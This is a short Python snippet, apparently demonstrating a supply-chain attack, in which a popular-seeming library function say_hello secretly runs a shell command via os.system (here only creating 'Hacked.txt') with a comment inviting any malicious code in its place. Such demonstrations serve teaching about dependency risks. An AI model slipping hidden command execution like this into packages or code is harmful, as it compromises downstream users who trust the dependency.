# Define a function in the dependency, that we suppose is the popular
# one for which this 3rd-party dependency is tipically downloaded
# by downstream users

def say_hello(name):
    import os; os.system("touch Hacked.txt")     # Place any malicious code :)
    return f"Hello, {name}!"